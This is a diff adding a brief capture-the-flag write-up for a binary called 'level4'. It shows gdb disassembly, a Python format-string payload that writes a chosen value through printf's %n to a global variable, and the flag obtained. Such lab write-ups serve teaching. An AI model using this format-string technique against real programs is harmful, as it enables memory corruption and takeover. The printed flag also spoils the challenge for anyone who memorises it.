@@ -1,0 +1,22 @@
+(gdb) disassemble main
+
+0x080484ad <+6>:	call   0x8048457 <n>
+
+(gdb) disassemble n
+
+0x08048488 <+49>:	call      0x8048444 <p>
+0x0804848d <+54>:	mov    eax,ds:0x8049810
+0x08048492 <+59>:	cmp    eax,0x1025544
+
+(gdb) disassemble p
+
+0x08048450 <+12>:	call   0x8048340 <printf@plt>
+
+Like the previous level, i will use printf to write a value to m.
+
+python -c "print('\x10\x98\x04\x08%12\$16930112x%12\$n')" > pl
+
+cat pl | ./level4
+…….
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+
